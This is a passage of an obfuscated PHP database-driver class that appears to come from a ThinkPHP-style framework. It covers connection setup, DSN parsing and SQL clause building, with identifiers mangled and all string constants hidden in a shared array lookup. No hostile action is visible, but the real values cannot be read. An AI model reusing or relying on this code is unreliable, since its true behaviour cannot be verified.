parseConfig($›ù½ñ™ğ = '') { $ ùÂùŒ =& $_SERVER[áäÒ½¯Ç]; if (!empty($›ù½ñ™ğ) && is_string($›ù½ñ™ğ)) { $›ù½ñ™ğ = $this->parseDSN($›ù½ñ™ğ); } elseif (is_array($›ù½ñ™ğ)) { $›ù½ñ™ğ = array_change_key_case($›ù½ñ™ğ); $›ù½ñ™ğ = array($ ùÂùŒ[1077] => $›ù½ñ™ğ[$ ùÂùŒ[1083]], $ ùÂùŒ[1001] => $›ù½ñ™ğ[$ ùÂùŒ[1084]], $ ùÂùŒ[1002] => $›ù½ñ™ğ[$ ùÂùŒ[1085]], $ ùÂùŒ[999] => $›ù½ñ™ğ[$ ùÂùŒ[1086]], $ ùÂùŒ[1000] => $›ù½ñ™ğ[$ ùÂùŒ[1087]], $ ùÂùŒ[21] => $›ù½ñ™ğ[$ ùÂùŒ[1088]], $ ùÂùŒ[1032] => $›ù½ñ™ğ[$ ùÂùŒ[1089]], $ ùÂùŒ[17] => isset($›ù½ñ™ğ[$ ùÂùŒ[1090]]) ? $›ù½ñ™ğ[$ ùÂùŒ[1090]] : array()); } elseif (empty($›ù½ñ™ğ)) { if (think_config($ ùÂùŒ[1091]) && $ ùÂùŒ[1080] != strtolower(think_config($ ùÂùŒ[1092]))) { $›ù½ñ™ğ = $this->parseDSN(think_config($ ùÂùŒ[1091])); } else { $›ù½ñ™ğ = array($ ùÂùŒ[1077] => think_config($ ùÂùŒ[1092]), $ ùÂùŒ[1001] => think_config($ ùÂùŒ[1093]), $ ùÂùŒ[1002] => think_config($ ùÂùŒ[1094]), $ ùÂùŒ[999] => think_config($ ùÂùŒ[1095]), $ ùÂùŒ[1000] => think_config($ ùÂùŒ[1096]), $ ùÂùŒ[21] => think_config($ ùÂùŒ[333]), $ ùÂùŒ[1032] => think_config($ ùÂùŒ[1091]), $ ùÂùŒ[17] => think_config($ ùÂùŒ[1097])); } } return $›ù½ñ™ğ; } protected function initConnect($ŠÆÀØ‰û = true) { if (1 == think_config($_SERVER[áäÒ½¯Ç][22])) { $this->_linkID = $this->multiConnect($ŠÆÀØ‰û); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Éò•ãßœ => $ì©˜ë˜‘) { $this->_linkID = $ì©˜ë˜‘; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ùÃğö£Ø = false) { $”§ªí¨Ï =& $_SERVER[áäÒ½¯Ç]; static $†õ‘ã†€ = array(); static $Ú–­‡åÎ = -1; if (empty($†õ‘ã†€)) { foreach ($this->config as $úœœ°‹Ò => $¸óŒ¢ò) { $†õ‘ã†€[$úœœ°‹Ò] = explode($”§ªí¨Ï[50], $¸óŒ¢ò); } } if (think_config($”§ªí¨Ï[1098])) { if ($ùÃğö£Ø || think_config($”§ªí¨Ï[491]) === !0) { $ÂÈ«ú¸„ = floor(mt_rand(0, think_config($”§ªí¨Ï[1099]) - 1)); $Ú–­‡åÎ = $ÂÈ«ú¸„; } else { if (is_numeric(think_config($”§ªí¨Ï[1100]))) { $ÂÈ«ú¸„ = think_config($”§ªí¨Ï[1100]); } else { $ÂÈ«ú¸„ = floor(mt_rand(think_config($”§ªí¨Ï[1099]), count($†õ‘ã†€[$”§ªí¨Ï[999]]) - 1)); } } } else { $ÂÈ«ú¸„ = floor(mt_rand(0, count($†õ‘ã†€[$”§ªí¨Ï[999]]) - 1)); $Ú–­‡åÎ = $ÂÈ«ú¸„; } $ÂÈ«ú¸„ = $Ú–­‡åÎ !== -1 ? $Ú–­‡åÎ : $ÂÈ«ú¸„; $ÈÒ€‡€ = array($”§ªí¨Ï[1001] => isset($†õ‘ã†€[$”§ªí¨Ï[1001]][$ÂÈ«ú¸„]) ? $†õ‘ã†€[$”§ªí¨Ï[1001]][$ÂÈ«ú¸„] : $†õ‘ã†€[$”§ªí¨Ï[1001]][0], $”§ªí¨Ï[1002] => isset($†õ‘ã†€[$”§ªí¨Ï[1002]][$ÂÈ«ú¸„]) ? $†õ‘ã†€[$”§ªí¨Ï[1002]][$ÂÈ«ú¸„] : $†õ‘ã†€[$”§ªí¨Ï[1002]][0], $”§ªí¨Ï[999] => isset($†õ‘ã†€[$”§ªí¨Ï[999]][$ÂÈ«ú¸„]) ? $†õ‘ã†€[$”§ªí¨Ï[999]][$ÂÈ«ú¸„] : $†õ‘ã†€[$”§ªí¨Ï[999]][0], $”§ªí¨Ï[1000] => isset($†õ‘ã†€[$”§ªí¨Ï[1000]][$ÂÈ«ú¸„]) ? $†õ‘ã†€[$”§ªí¨Ï[1000]][$ÂÈ«ú¸„] : $†õ‘ã†€[$”§ªí¨Ï[1000]][0], $”§ªí¨Ï[21] => isset($†õ‘ã†€[$”§ªí¨Ï[21]][$ÂÈ«ú¸„]) ? $†õ‘ã†€[$”§ªí¨Ï[21]][$ÂÈ«ú¸„] : $†õ‘ã†€[$”§ªí¨Ï[21]][0], $”§ªí¨Ï[1032] => isset($†õ‘ã†€[$”§ªí¨Ï[1032]][$ÂÈ«ú¸„]) ? $†õ‘ã†€[$”§ªí¨Ï[1032]][$ÂÈ«ú¸„] : $†õ‘ã†€[$”§ªí¨Ï[1032]][0], $”§ªí¨Ï[17] => isset($†õ‘ã†€[$”§ªí¨Ï[17]][$ÂÈ«ú¸„]) ? $†õ‘ã†€[$”§ªí¨Ï[17]][$ÂÈ«ú¸„] : $†õ‘ã†€[$”§ªí¨Ï[17]][0]); return $this->connect($ÈÒ€‡€, $ÂÈ«ú¸„); } public function parseDSN($ÃÑ•ŞÖã) { $ü–İ„ëä =& $_SERVER[áäÒ½¯Ç]; if (empty($ÃÑ•ŞÖã)) { return !1; } $ĞÎØ÷ = parse_url($ÃÑ•ŞÖã); if ($ĞÎØ÷[$ü–İ„ëä[206]]) { $Û©âï§Ù = array($ü–İ„ëä[1077] => $ĞÎØ÷[$ü–İ„ëä[206]], $ü–İ„ëä[1001] => isset($ĞÎØ÷[$ü–İ„ëä[690]]) ? $ĞÎØ÷[$ü–İ„ëä[690]] : $ü–İ„ëä[12], $ü–İ„ëä[1002] => isset($ĞÎØ÷[$ü–İ„ëä[1101]]) ? $ĞÎØ÷[$ü–İ„ëä[1101]] : $ü–İ„ëä[12], $ü–İ„ëä[999] => isset($ĞÎØ÷[$ü–İ„ëä[207]]) ? $ĞÎØ÷[$ü–İ„ëä[207]] : $ü–İ„ëä[12], $ü–İ„ëä[1000] => isset($ĞÎØ÷[$ü–İ„ëä[208]]) ? $ĞÎØ÷[$ü–İ„ëä[208]] : $ü–İ„ëä[12], $ü–İ„ëä[21] => isset($ĞÎØ÷[$ü–İ„ëä[87]]) ? substr($ĞÎØ÷[$ü–İ„ëä[87]], 1) : $ü–İ„ëä[12]); } else { preg_match($ü–İ„ëä[1102], trim($ÃÑ•ŞÖã), $õÍ †ÈÙ); $Û©âï§Ù = array($ü–İ„ëä[1077] => $õÍ †ÈÙ[1], $ü–İ„ëä[1001] => $õÍ †ÈÙ[2], $ü–İ„ëä[1002] => $õÍ †ÈÙ[3], $ü–İ„ëä[999] => $õÍ †ÈÙ[4], $ü–İ„ëä[1000] => $õÍ †ÈÙ[5], $ü–İ„ëä[21] => $õÍ †ÈÙ[6]); } $Û©âï§Ù[$ü–İ„ëä[1032]] = $ü–İ„ëä[12]; return $Û©âï§Ù; } protected function debug() { $µ­ßíĞ =& $_SERVER[áäÒ½¯Ç]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $µ­ßíĞ[1103]; if (think_config($µ­ßíĞ[1104])) { think_status($µ­ßíĞ[1105]); think_trace($this->queryStr . $µ­ßíĞ[1106] . think_status($µ­ßíĞ[24], $µ­ßíĞ[1105], 6) . $µ­ßíĞ[1107], $µ­ßíĞ[12], $µ­ßíĞ[1108]); } } protected function parseLock($äÜı­Åà = false) { $Çàª—Ï =& $_SERVER[áäÒ½¯Ç]; if (!$äÜı­Åà) { return $Çàª—Ï[12]; } if ($Çàª—Ï[1034] == $this->dbType) { return $Çàª—Ï[1109]; } return $Çàª—Ï[1110]; } protected function parseSet($ãº¿î…€) { $ â°Øƒç =& $_SERVER[áäÒ½¯Ç]; foreach ($ãº¿î…€ as $À‡ÁÎÀ => $¯äñÎÍá) { if (is_array($¯äñÎÍá) && $ â°Øƒç[382] == $¯äñÎÍá[0]) { $†ÏÌ¢½¯[] = $this->parseKey($À‡ÁÎÀ) . $ â°Øƒç[473] . $¯äñÎÍá[1]; } elseif (is_scalar($¯äñÎÍá) || is_null($¯äñÎÍá)) { $†ÏÌ¢½¯[] = $this->parseKey($À‡ÁÎÀ) . $ â°Øƒç[473] . $this->parseValue($¯äñÎÍá); } } return $ â°Øƒç[1111] . implode($ â°Øƒç[50], $†ÏÌ¢½¯); } protected function bindParam($Ü²÷‡¸¿, $Ÿ°ƒğ·) { $this->bind[$_SERVER[áäÒ½¯Ç][4] . $Ü²÷‡¸¿] = $Ÿ°ƒğ·; } protected function parseBind($¹Ûâ§¦Á) { $¹Ûâ§¦Á = array_merge($this->bind, $¹Ûâ§¦Á); $this->bind = array(); return $¹Ûâ§¦Á; } function parseKey(&$³‰Š–¨Î, $Îéí´™è = true) { if ($Îéí´™è) { $³‰Š–¨Î = $this->parseKeyCheck($³‰Š–¨Î); } return $³‰Š–¨Î; } function parseKeyCheck($êÁë®ñİ) { $Éû€ÁÇ =& $_SERVER[áäÒ½¯Ç]; $êÁë®ñİ = trim($êÁë®ñİ); if (!preg_match($Éû€ÁÇ[1112], $êÁë®ñİ)) { think_exception($Éû€ÁÇ[1113] . $êÁë®ñİ); } return $êÁë®ñİ; } protected function parseValue($Õ¨îÕ•À) { $Ä‹ø”¨æ =& $_SERVER[áäÒ½¯Ç]; if (is_string($Õ¨îÕ•À)) { $Õ¨îÕ•À = $Ä‹ø”¨æ[1073] . $this->escapeString($Õ¨îÕ•À) . $Ä‹ø”¨æ[1073]; } elseif (isset($Õ¨îÕ•À[0]) && is_string($Õ¨îÕ•À[0]) && strtolower($Õ¨îÕ•À[0]) == $Ä‹ø”¨æ[382]) { $Õ¨îÕ•À = $this->escapeString($Õ¨îÕ•À[1]); } elseif (is_array($Õ¨îÕ•À)) { $Õ¨îÕ•À = array_map(array($this, $Ä‹ø”¨æ[1074]), $Õ¨îÕ•À); } elseif (is_bool($Õ¨îÕ•À)) { $Õ¨îÕ•À = $Õ¨îÕ•À ? $Ä‹ø”¨æ[91] : $Ä‹ø”¨æ[239]; } elseif (is_null($Õ¨îÕ•À)) { $Õ¨îÕ•À = $Ä‹ø”¨æ[104]; } return $Õ¨îÕ•À; } protected function parseField($ş¯Š¡€€) { $ÓÜŠŒ·İ =& $_SERVER[áäÒ½¯Ç]; if (is_string($ş¯Š¡€€) && strpos($ş¯Š¡€€, $ÓÜŠŒ·İ[50])) { $ş¯Š¡€€ = explode($ÓÜŠŒ·İ[50], $ş¯Š¡€€); } if (is_array($ş¯Š¡€€)) { $ÅÓ›ê´Ê = array(); foreach ($ş¯Š¡€€ as $•˜áé‰” => $­Ÿƒå«…) { if (!is_numeric($•˜áé‰”)) { $ÅÓ›ê´Ê[] = $this->parseKey($•˜áé‰”, !1) . $ÓÜŠŒ·İ[1114] . $this->parseKey($­Ÿƒå«…); } else { $ÅÓ›ê´Ê[] = $this->parseKey($­Ÿƒå«…); } } $ºÄ³ÏÔ = implode($ÓÜŠŒ·İ[50], $ÅÓ›ê´Ê); } elseif (is_string($ş¯Š¡€€) && !empty($ş¯Š¡€€)) { $ºÄ³ÏÔ = $ş¯Š¡€€; } else { $ºÄ³ÏÔ = $ÓÜŠŒ·İ[231]; } return $ºÄ³ÏÔ; } protected function parseTable($Òã„õ—Ï) { $Å¹«ø³ =& $_SERVER[áäÒ½¯Ç]; if (is_array($Òã„õ—Ï)) { $³ªïÖÁ = array(); foreach ($Òã„õ—Ï as $‡Ã ËòÎ => $±æ›¼Ïå) { if (!is_numeric($‡Ã ËòÎ)) { $³ªïÖÁ[] = $this->parseKey($‡Ã ËòÎ) . $Å¹«ø³[53] . $this->parseKey($±æ›¼Ïå); } else { $³ªïÖÁ[] = $this->parseKey($‡Ã ËòÎ); } } $Òã„õ—Ï = $³ªïÖÁ; } elseif (is_string($Òã„õ—Ï)) { if (strstr($Òã„õ—Ï, $Å¹«ø³[53])) { return $Òã„õ—Ï; } $Òã„õ—Ï = explode($Å¹«ø³[50], $Òã„õ—Ï); array_walk($Òã„õ—Ï, array($this, $Å¹«ø³[1019])); } return $Å¹«ø³[1013] . trim(implode($Å¹«ø³[1115], $Òã„õ—Ï), $Å¹«ø³[481]) . $Å¹«ø³[1013]; } protected function parseWhere($§î¼·ĞÔ) { $÷•ÍÊ¶ =& $_SERVER[áäÒ½¯Ç]; $òØ¾şà· = $÷•ÍÊ¶[12]; if (is_string($§î¼·ĞÔ)) { $òØ¾şà· = $§î¼·ĞÔ; } else { $›ú’ª¢’ = isset($§î¼·ĞÔ[$÷•ÍÊ¶[1116]]) ? strtoupper($§î¼·ĞÔ[$÷•ÍÊ¶[1116]]) : $÷•ÍÊ¶[12]; if (in_array($›ú’ª¢’, array($÷•ÍÊ¶[1117], $÷•ÍÊ¶[1118], $÷•ÍÊ¶[1119]))) { $›ú’ª¢’ = $÷•ÍÊ¶[53] . $›ú’ª¢’ . $÷•ÍÊ¶[53]; unset($§î¼·ĞÔ[$÷•ÍÊ¶[1116]]); } else { $›ú’ª¢’ = $÷•ÍÊ¶[1120]; } foreach ($§î¼·ĞÔ as $šİĞ™›™ => $ê–ıâ®ç) { $òØ¾şà· .= $÷•ÍÊ¶[365]; if (is_numeric($šİĞ™›™)) { $šİĞ™›™ = $÷•ÍÊ¶[1121]; } if (0 === strpos($šİĞ™›™, $÷•ÍÊ¶[11])) { $òØ¾şà· .= $this->parseThinkWhere($šİĞ™›™, $ê–ıâ®ç); } else { if (!preg_match($÷•ÍÊ¶[1122], trim($šİĞ™›™))) { think_exception(think_lang($÷•ÍÊ¶[1123]) . $÷•ÍÊ¶[4] . $šİĞ™›™); } $·‹“³Ô = is_array($ê–ıâ®ç) && isset($ê–ıâ®ç[$÷•ÍÊ¶[1124]]); $šİĞ™›™ = trim($šİĞ™›™); if (strpos($šİĞ™›™, $÷•ÍÊ¶[213])) { $ñîËŞØÇ = explode($÷•ÍÊ¶[213], $šİĞ™›™); $¦¾¶„Ò = array(); foreach ($ñîËŞØÇ as $¤ŸÍ“…Ï => $¼Ï•„ÁÛ) { $Èçùı½™ = $·‹“³Ô ? $ê–ıâ®ç[$¤ŸÍ“…Ï] : $ê–ıâ®ç; $¦¾¶„Ò[] = $÷•ÍÊ¶[347] . $this->parseWhereItem($this->parseKey($¼Ï•„ÁÛ), $Èçùı½™) . $÷•ÍÊ¶[1018]; } $òØ¾şà· .= implode($÷•ÍÊ¶[1125], $¦¾¶„Ò); } elseif (strpos($šİĞ™›™, $÷•ÍÊ¶[295])) { $ñîËŞØÇ = explode($÷•ÍÊ¶[295], $šİĞ™›™); $¦¾¶„Ò = array(); foreach ($ñîËŞØÇ as $¤ŸÍ“…Ï => $¼Ï•„ÁÛ) { $Èçùı½™ = $·‹“³Ô ? $ê–ıâ®ç[$¤ŸÍ“…Ï] : $ê–ıâ®ç; $¦¾¶„Ò[] = $÷•ÍÊ¶[347] . $this->parseWhereItem($this->parseKey($¼Ï•„ÁÛ), $Èçùı½™) . $÷•ÍÊ¶[1018]; } $òØ¾şà· .= implode($÷•ÍÊ¶[1120], $¦¾¶„Ò); } else { $òØ¾şà· .= $this->parseWhereItem($this->parseKey($šİĞ™›™), $ê–ıâ®ç); } } $òØ¾şà· .= $÷•ÍÊ¶[366] . $›ú’ª¢’; } $òØ¾şà· = substr($òØ¾şà·, 0, -strlen($›ú’ª¢’)); } return empty($òØ¾şà·) ? $÷•ÍÊ¶[12] : $÷•ÍÊ¶[1126] . $òØ¾şà·; } protected function parseWhereItem($«–·ÖÉ, $†²ÉÜîà) { $Ë‘ââÊå =& $_SERVER[áäÒ½¯Ç]; $—¦‹ì— = $Ë‘ââÊå[12]; if (is_array($†²ÉÜîà)) { if (is_string($†²ÉÜîà[0])) { $ÈŞèƒ£Ù = strtolower($†²ÉÜîà[0]); if (in_array($†²ÉÜîà[0], array($Ë‘ââÊå[473], $Ë‘ââÊå[1127], $Ë‘ââÊå[1128], $Ë‘ââÊå[1129], $Ë‘ââÊå[1130], $Ë‘ââÊå[1131]))) { $—¦‹ì— .= $«–·ÖÉ . $Ë‘ââÊå[53] . $†²ÉÜîà[0] . $Ë‘ââÊå[53] . $this->parseValue($†²ÉÜîà[1]); } elseif (preg_match($Ë‘ââÊå[1132], $†²ÉÜîà[0])) { $—¦‹ì— .= $«–·ÖÉ . $Ë‘ââÊå[53] . $this->exp[$ÈŞèƒ£Ù] . $Ë‘ââÊå[53] . $this->parseValue($†²ÉÜîà[1]); } elseif (preg_match($Ë‘ââÊå[1133], $†²ÉÜîà[0])) { if (is_array($†²ÉÜîà[1])) { $ÂÚßó¸ñ = isset($†²ÉÜîà[2]) ? strtoupper($†²ÉÜîà[2]) : $Ë‘ââÊå[1118]; if (in_array($ÂÚßó¸ñ, array($Ë‘ââÊå[1117], $Ë‘ââÊå[1118], $Ë‘ââÊå[1119]))) { $ªªğá…ø = array(); foreach ($†²ÉÜîà[1] as $Ç÷ÚéÃ€) { $ªªğá…ø[] = $«–·ÖÉ . $Ë‘ââÊå[53] . $this->exp[$ÈŞèƒ£Ù] . $Ë‘ââÊå[53] . $this->parseValue($Ç÷ÚéÃ€); } $—¦‹ì— .= $Ë‘ââÊå[347] . implode($Ë‘ââÊå[53] . $ÂÚßó¸ñ . $Ë‘ââÊå[53], $ªªğá…ø) . $Ë‘ââÊå[1018]; } } else { $—¦‹ì— .= $«–·ÖÉ . $Ë‘ââÊå[53] . $this->exp[$ÈŞèƒ£Ù] . $Ë‘ââÊå[53] . $this->parseValue($†²ÉÜîà[1]); } } elseif ($Ë‘ââÊå[382] == $ÈŞèƒ£Ù) { $—¦‹ì— .= $Ë‘ââÊå[1016] . $«–·ÖÉ . $Ë‘ââÊå[53] . $†²ÉÜîà[1] . $Ë‘ââÊå[1134]; } elseif (preg_match($Ë‘ââÊå[1135], $†²ÉÜîà[0])) { $—¦‹ì— .= $†²ÉÜîà[0]; } elseif (preg_match($Ë‘ââÊå[1136], $†²ÉÜîà[0])) { if (isset($†²ÉÜîà[2]) && $Ë‘ââÊå[382] == $†²ÉÜîà[2]) { $—¦‹ì— .= $«–·ÖÉ . $Ë‘ââÊå[53] . $this->exp[$ÈŞèƒ£Ù] . $Ë‘ââÊå[53] . $†²ÉÜîà[1]; } else { if (is_string($†²ÉÜîà[1])) { $†²ÉÜîà[1] = explode($Ë‘ââÊå[50], $†²ÉÜîà[1]); } $‡ñœíØı = implode($Ë‘ââÊå[50], $this->parseValue($†²ÉÜîà[1])); $—¦‹ì— .= $«–·ÖÉ . $Ë‘ââÊå[53] . $this->exp[$ÈŞèƒ£Ù] . $Ë‘ââÊå[1016] . $‡ñœíØı . $Ë‘ââÊå[1018]; } } elseif (preg_match($Ë‘ââÊå[1137], $†²ÉÜîà[0])) { $³¯Ô¾£Ÿ = is_string($†²ÉÜîà[1]) ? explode($Ë‘ââÊå[50], $†²ÉÜîà[1]) : $†²ÉÜîà[1]; $—¦‹ì— .= $Ë‘ââÊå[1016] . $«–·ÖÉ . $Ë‘ââÊå[53] . $this->exp[$ÈŞèƒ£Ù] . $Ë‘ââÊå[53] . $this->parseValue($³¯Ô¾£Ÿ[0]) . $Ë‘ââÊå[1120] . $this->parseValue($³¯Ô¾£Ÿ[1]) . $Ë‘ââÊå[366]; } else { think_exception(think_lang($Ë‘ââÊå[1123]) . $Ë‘ââÊå[4] . $†²ÉÜîà[0]); } } else { $«Ûİêúœ = count($†²ÉÜîà); $â­â²‡× = $Ë‘ââÊå[12]; if (is_string($†²ÉÜîà[$«Ûİêúœ - 1])) { $â­â²‡× = isset($†²ÉÜîà[$«Ûİêúœ - 1]) ? strtoupper($†²ÉÜîà[$«Ûİêúœ - 1]) : $Ë‘ââÊå[12]; if (in_array($â­â²‡×, array($Ë‘ââÊå[1117], $Ë‘ââÊå[1118], $Ë‘ââÊå[1119]))) { $«Ûİêúœ = $«Ûİêúœ - 1; } } else { $â­â²‡× = $Ë‘ââÊå[1117]; } for ($ÊòÍÕ­¹ = 0; $ÊòÍÕ­¹ < $«Ûİêúœ; $ÊòÍÕ­¹++) { $³¯Ô¾£Ÿ = is_array($†²ÉÜîà[$ÊòÍÕ­¹]) ? $†²ÉÜîà[$ÊòÍÕ­¹][1] : $†²ÉÜîà[$ÊòÍÕ­¹]; if ($Ë‘ââÊå[382] == strtolower($†²ÉÜîà[$ÊòÍÕ­¹][0])) { $—¦‹ì— .= $Ë‘ââÊå[347] . $«–·ÖÉ . $Ë‘ââÊå[53] . $³¯Ô¾£Ÿ . $Ë‘ââÊå[1134] . $â­â²‡× . $Ë‘ââÊå[53]; } else { $²ãÅù¿É = is_array($†²ÉÜîà[$ÊòÍÕ­¹]) ? $this->exp[strtolower($†²ÉÜîà[$ÊòÍÕ­¹][0])] : $Ë‘ââÊå[473]; if (!$²ãÅù¿É && is_array($†²ÉÜîà[$ÊòÍÕ­¹]) && in_array($†²ÉÜîà[$ÊòÍÕ­¹][0], array($Ë‘ââÊå[473], $Ë‘ââÊå[1127], $Ë‘ââÊå[1128], $Ë‘ââÊå[1129], $Ë‘ââÊå[1130], $Ë‘ââÊå[1131]))) { $²ãÅù¿É = $†²ÉÜîà[$ÊòÍÕ­¹][0]; } $—¦‹ì— .= $Ë‘ââÊå[347] . $«–·ÖÉ . $Ë‘ââÊå[53] . $²ãÅù¿É . $Ë‘ââÊå[53] . $this->parseValue($³¯Ô¾£Ÿ) . $Ë‘ââÊå[1134] . $â­â²‡× . $Ë‘ââÊå[53]; } } $—¦‹ì— = substr($—¦‹ì—, 0, -4); } } else { $—¦‹ì— .= $«–·ÖÉ . $Ë‘ââÊå[1138] . $this->parseValue($†²ÉÜîà); } return $—¦‹ì—; } protected function parseThinkWhere($í•ç™‹¦, $æ¹‰§®ù) { $”ª£™‰Û =& $_SERVER[áäÒ½¯Ç]; $±çä‰äì = $”ª£™‰Û[12]; switch ($í•ç™‹¦) { case $”ª£™‰Û[437]: $±çä‰äì = $æ¹‰§®ù; break; case $”ª£™‰Û[1121]: $±çä‰äì = is_string($æ¹‰§®ù) ? $æ¹‰§®ù : substr($this->parseWhere($æ¹‰§®ù), 6); break; case $”ª£™‰Û[1139]: parse_str($æ¹‰§®ù, $°Š¶¹òô); if (isset($°Š¶¹òô[$”ª£™‰Û[1116]])) { $ÎÂŞ‹º¿ = $”ª£™‰Û[53] . strtoupper($°Š¶¹òô[$”ª£™‰Û[1116]]) . $”ª£™‰Û[53]; unset($°Š¶¹òô[$”ª£™‰Û[1116]]); } else { $ÎÂŞ‹º¿ = $”ª£™‰Û[1120]; } $úà®ªøø = array(); foreach ($°Š¶¹òô as $Ê æº => $¦÷¸ø) { $úà®ªøø[] = $this->parseKey($Ê æº) . $”ª£™‰Û[1138] . $this->parseValue($¦÷¸ø); } $±çä‰äì = implode($ÎÂŞ‹º¿, $úà®ªøø); break; } return $±çä‰äì; } protected function parseLimit($îú‰Å›ƒ) { $ÙÁ­²Ÿ² =& $_SERVER[áäÒ½¯Ç]; return !empty($îú‰Å›ƒ) ? $ÙÁ­²Ÿ²[51] . $îú‰Å›ƒ . $ÙÁ­²Ÿ²[53] : $ÙÁ­²Ÿ²[12]; } protected function parseJoin($Ğšåß±¹) { $œÛ¢ èÒ =& $_SERVER[áäÒ½¯Ç]; $½»Ï¶Œª = $œÛ¢ èÒ[12]; if (!empty($Ğšåß±¹)) { if (is_array($Ğšåß±¹)) { foreach ($Ğšåß±¹ as $¤ãœ®ò => $¿öáâÕ…) { if (!1 !== stripos($¿öáâÕ…, $œÛ¢ èÒ[1140])) { $½»Ï¶Œª .= $œÛ¢ èÒ[53] . $¿öáâÕ…; } else { $½»Ï¶Œª .= $œÛ¢ èÒ[1141] . $¿öáâÕ…; } } } else { $½»Ï¶Œª .= $œÛ¢ èÒ[1141] . $Ğšåß±¹; } } $½»Ï¶Œª = preg_replace($œÛ¢ èÒ[1142], think_config($œÛ¢ èÒ[1046]) . $œÛ¢ èÒ[1143], $½»Ï¶Œª); return $½»Ï¶Œª; } protected function parseOrder($Ë×ŒîÉ˜) { $æ½¯˜Ì¨ =& $_SERVER[áäÒ½¯Ç]; if (is_array($Ë×ŒîÉ˜)) { $¡´Ñ¦™ = array(); foreach ($Ë×ŒîÉ˜ as $Ÿ€àÃ˜² => $«ŸìÏí) { if (is_numeric($Ÿ€àÃ˜²)) { $¡´Ñ¦™[] = $this->parseKey($«ŸìÏí); } else { $«ŸìÏí = in_array(strtoupper(trim($«ŸìÏí)), array($æ½¯˜Ì¨[1144], $æ½¯˜Ì¨[1145])) ? $æ½¯˜Ì¨[53] . $«ŸìÏí : $æ½¯˜Ì¨[12]; if (preg_match($æ½¯˜Ì¨[1146], $Ÿ€àÃ˜²)) { $¡´Ñ¦™[] = $this->parseKey($Ÿ€àÃ˜²) . $«ŸìÏí; } else { think_exception($æ½¯˜Ì¨[1147] . $Ÿ€àÃ˜²); } } } $Ë×ŒîÉ˜ = implode($æ½¯˜Ì¨[50], $¡´Ñ¦™); } return !empty($Ë×ŒîÉ˜) ? $æ½¯˜Ì¨[1148] . $Ë×ŒîÉ˜ : $æ½¯˜Ì¨[12]; } protected function parseGroup($•çå™ò) { $Â³ñ¥‹ =& $_SERVER[áäÒ½¯Ç]; return !empty($•çå™ò) ? $Â³ñ¥‹[1149] . $•çå™ò : $Â³ñ¥‹[12]; } protected function parseHaving($«µíºõ®) { $ø°‘•· =& $_SERVER[áäÒ½¯Ç]; return !empty($«µíºõ®) ? $ø°‘•·[1150] . $«µíºõ® : $ø°‘•·[12]; } protected function parseComment($‹ù½ùé÷) { $ĞûÖµÃñ =& $_SERVER[áäÒ½¯Ç]; return !empty($‹ù½ùé÷) ? $ĞûÖµÃñ[1151] . $‹ù½ùé÷ . $ĞûÖµÃñ[1152] : $ĞûÖµÃñ[12]; } protected function parseDistinct($±µÔ¡) { $´İøØÕ =& $_SERVER[áäÒ½¯Ç]; return !empty($±µÔ¡) ? $´İøØÕ[1153] : $´İøØÕ[12]; } protected function parseUnion($êÉ×ÅÔ³) { $Î‚÷‚å­ =& $_SERVER[áäÒ½¯Ç]; if (empty($êÉ×ÅÔ³)) { return $Î‚÷‚å­[12]; } if (isset($êÉ×ÅÔ³[$Î‚÷‚å­[433]])) { $Õ‚¡ò¹î = $Î‚÷‚å­[1154]; unset($êÉ×ÅÔ³[$Î‚÷‚å­[433]]); } else { $Õ‚¡ò¹î = $Î‚÷‚å­[1155]; } foreach ($êÉ×ÅÔ³ as $âÃ¯à¬ı) { $Ù¿¶Ş‚[] = $Õ‚¡ò¹î . (is_array($âÃ¯à¬ı) ? $this->buildSelectSql($âÃ¯à¬ı) : $âÃ¯à¬ı); } return implode($Î‚÷‚å­[53], $Ù¿¶Ş‚); } public function insert($úö¥Ñ°, $ÖÅÉ¿¼î = array(), $Ëëğ…Ä„ = false) { $ñğ•”Óœ =& $_SERVER[áäÒ½¯Ç]; $æå£ØÀ• = $øõ¤§ÓÊ = array(); $this->model = $ÖÅÉ¿¼î[$ñğ•”Óœ[369]]; foreach ($úö¥Ñ° as $¼‹øÓØŞ => $ü²¢©´µ) { if (is_array($ü²¢©´µ) && $ñğ•”Óœ[382] == $ü²¢©´µ[0]) { $øõ¤§ÓÊ[] = $this->parseKey($¼‹øÓØŞ); $æå£ØÀ•[] = $ü²¢©´µ[1]; } elseif (is_scalar($ü²¢©´µ) || is_null($ü²¢©´µ)) { $øõ¤§ÓÊ[] = $this->parseKey($¼‹øÓØŞ); $æå£ØÀ•[] = $this->parseValue($ü²¢©´µ); } } $ìÒ„¥ª = ($Ëëğ…Ä„ ? $ñğ•”Óœ[1020] : $ñğ•”Óœ[1021]) . $ñğ•”Óœ[1022] . $this->parseTable($ÖÅÉ¿¼î[$ñğ•”Óœ[367]]) . $ñğ•”Óœ[1016] . implode($ñğ•”Óœ[50], $øõ¤§ÓÊ) . $ñğ•”Óœ[1017] . implode($ñğ•”Óœ[50], $æå£ØÀ•) . $ñğ•”Óœ[1018]; $ìÒ„¥ª .= $this->parseLock(isset($ÖÅÉ¿¼î[$ñğ•”Óœ[957]]) ? $ÖÅÉ¿¼î[$ñğ•”Óœ[957]] : !1); $ìÒ„¥ª .= $this->parseComment(!empty($ÖÅÉ¿¼î[$ñğ•”Óœ[439]]) ? $ÖÅÉ¿¼î[$ñğ•”Óœ[439]] : $ñğ•”Óœ[12]); return $this->execute($ìÒ„¥ª, $this->parseBind(!empty($ÖÅÉ¿¼î[$ñğ•”Óœ[371]]) ? $ÖÅÉ¿¼î[$ñğ•”Óœ[371]] : array())); } public function selectInsert($¨‘€áü», $Šˆ©ê“, $»Ëğòä¡ = array()) { $õËä±Ú =& $_SERVER[áäÒ½¯Ç]; $this->model = $»Ëğòä¡[$õËä±Ú[369]]; if (is_string($¨‘€áü»)) { $¨‘€áü» = explode($õËä±Ú[50], $¨‘€áü»); } array_walk($¨‘€áü», array($this, $õËä±Ú[1019])); $Ğ‰œìª = $õËä±Ú[1156] . $this->parseTable($Šˆ©ê“) . $õËä±Ú[1016] . implode($õËä±Ú[50], $¨‘€áü») . $õËä±Ú[1134]; $Ğ‰œìª .= $this->buildSelectSql($»Ëğòä¡); return $this->execute($Ğ‰œìª, 